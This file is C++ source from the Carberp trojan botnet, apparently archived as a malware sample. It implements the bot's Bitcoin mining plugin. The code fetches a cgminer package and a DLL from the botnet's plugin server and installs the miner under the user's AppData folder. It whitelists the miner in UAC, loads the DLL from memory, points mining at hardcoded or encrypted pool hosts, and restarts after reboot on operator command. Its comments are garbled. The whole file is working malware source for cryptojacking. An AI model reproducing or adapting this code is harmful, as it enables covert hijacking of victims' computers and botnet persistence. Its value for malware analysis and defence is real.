/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "bitcoin.h"
#include "BotDebug.h"
#include "BotCore.h"
#include "Plugins.h"
#include "inject.h"
#include <shlobj.h>
#include <shlwapi.h>

#define DbgBtc(...) PP_DPRINTF("Bitcoin " __VA_ARGS__)

const char* mutexBitcoin = "bitcoin";
const char* eventStopBitcoin = "bitcoin_stop";
const char* nameBtcmCab = "btcm.plug";
const char* nameBtcDll = "btc.plug";
const char* flagBitcoinRunned = "bitcoin_runned.txt";

typedef void (WINAPI *typeInit)(char *urls, WCHAR *miner_path);
typedef void (WINAPI *typeStop)();

#ifndef DEBUGCONFIG
	char BITCOIN_HOSTS[BITCOIN_PARAM_SIZE_HOSTS] = BITCOIN_PARAM_NAME_HOSTS;
#else
	char BITCOIN_HOSTS[BITCOIN_PARAM_SIZE_HOSTS] = "az.zika.in\0";
#endif

static char* GetBitcoinFolder( char* path )
{
	pSHGetFolderPathA( 0, CSIDL_APPDATA,  0, 0, path );
	pPathAppendA( path, "bitcoin" );
	return path;
}

static DWORD WINAPI ProcessBitcoin(void*)
{
	BOT::Initialize();
	DbgBtc( "������ �������� bitcoin" );
	HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
	if( mutex == 0 ) return 0; //��� ���� ����� �������
	DWORD sizeBtcmCab;
	//��������� cgminer � cab ������
	BYTE* btcmCab = Plugin::DownloadEx( (char*)nameBtcmCab, 0, &sizeBtcmCab, false, true, 0 );
	DWORD sizeBtcDll;
	//��������� ���, ����������� ���� ����������
	BYTE* btcDll = Plugin::DownloadEx( (char*)nameBtcDll, 0, &sizeBtcDll, true, true, 0 );
	if( btcmCab && btcDll ) //������� �����������
	{
		DbgBtc( "������� �����������" );
		char tempCab[MAX_PATH], folderBitcoin[MAX_PATH];
		File::GetTempName(tempCab);
		File::WriteBufferA( tempCab, btcmCab, sizeBtcmCab );
		DbgBtc( "��������� btcm.plug � %s", tempCab );
		GetBitcoinFolder(folderBitcoin);
		pCreateDirectoryA( folderBitcoin, 0 );
		pPathAppendA( folderBitcoin, "miner" );
		bool res = ExtractCab( tempCab, folderBitcoin );
		DeleteFileA(tempCab);
		if( res )
		{
			pPathAppendA( folderBitcoin, "cgminer.exe" );
			AddAllowedprogramUAC(folderBitcoin);
			//��������� � ������ ����
			DbgBtc( "����������� cgmimer � ����� %s", folderBitcoin );
			TMemoryDLL btc(btcDll);
			typeInit Init = (typeInit)btc.GetProcAddress("InitMiner");
			typeStop Stop = (typeStop)btc.GetProcAddress("StopMiner");
			if( Init && Stop )
			{
				DbgBtc( "������� �������" );

				//��������� ������� ����, ��������� �� ;
				char urls[BITCOIN_PARAM_SIZE_HOSTS];
				TStrEnum E(BITCOIN_HOSTS, BITCOIN_PARAM_ENCRYPTED_HOSTS, 0);
				urls[0] = 0;
				while (E.Next())
				{
					if( urls[0] ) m_lstrcat( urls, ";" );
					m_lstrcat( urls, E.Line().t_str() );
				}

				wchar_t* folderBitcoinW = AnsiToUnicode( folderBitcoin, 0 );

				DbgBtc( "�������� InitMiner(%s, %ls)", urls, folderBitcoinW );
				Init( urls, folderBitcoinW );
				DbgBtc( "InitMiner() �������� �������" );
				MemFree(folderBitcoinW);
				string fileFlag = BOT::MakeFileName( 0, flagBitcoinRunned );
				File::WriteBufferA( fileFlag.t_str(), 0, 0 );
				HANDLE hevent = pCreateEventA( 0, 0, 0, eventStopBitcoin );
				pResetEvent(hevent);
				//���� ���� �� �������� ������� �� ���������
				pWaitForSingleObject( hevent, INFINITE );
				Stop();
				pDeleteFileA(fileFlag.t_str());
				DbgBtc( "������ ����������" );
			}
		}
	}

	MemFree(btcmCab);
	MemFree(btcDll);
	pCloseHandle(mutex);
	DbgBtc( "������� ��������" );
	return 0;
}

static void StopBitcoinPlugin()
{
	HANDLE hevent = pCreateEventA( 0, 0, 0, eventStopBitcoin );
	pSetEvent(hevent);
	pSleep(5 * 1000);
}

static void DeleteBitcoinPlugin()
{
	StopBitcoinPlugin();
	char folderBitcoin[MAX_PATH];
	m_memset( folderBitcoin, 0, sizeof(folderBitcoin) );
	GetBitcoinFolder(folderBitcoin);
	pPathAppendA( folderBitcoin, "miner" );
	DeleteFolders(folderBitcoin);
	Plugin::DeleteFromCache((char*)nameBtcmCab);
	Plugin::DeleteFromCache((char*)nameBtcDll);
}

bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	bool ret = false;
	if( m_lstrcmp( Args, "del" ) == 0 ) //�������� �������
	{
		DeleteBitcoinPlugin();
		ret = true;
	}
	else if( m_lstrcmp( Args, "stop" ) == 0 ) //��������� �������
	{
		StopBitcoinPlugin();
		ret = true;
	}
	else //������ �������
	{
//		HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
//		if( mutex != 0 ) //������ �� �������
//		{
//			pCloseHandle(mutex);
//			MegaJump(ProcessBitcoin);
//		}
//		else //������ �������, ������� � ��������� �����
//		{
			DeleteBitcoinPlugin();
			MegaJump(ProcessBitcoin);
//		}
		ret = true;
	}
	return ret;
}

void BitcoinRunAfterReboot()
{
	if( Bot->FileExists( 0, flagBitcoinRunned ) ) //���� ���� ���� ����, �� ���������
	{
		MegaJump(ProcessBitcoin);
	}
}
